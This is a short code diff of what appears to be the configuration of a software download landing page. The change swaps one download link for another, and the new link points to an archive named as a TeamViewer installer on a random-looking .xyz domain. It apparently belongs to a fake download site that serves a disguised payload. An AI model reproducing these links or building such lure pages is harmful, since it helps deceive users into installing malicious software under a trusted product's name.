@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://risanhs-sdad1e4asd-3css3hub.xyz/RUIIOPC_xp-win11_x64_Dxccimxhsse_v260036.90023.zip", 
+    downloadUrl: "https://lsidjnsaofnasbfndg-oss3.xyz/Yet_TeamViewer_Setup_x64.rar", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
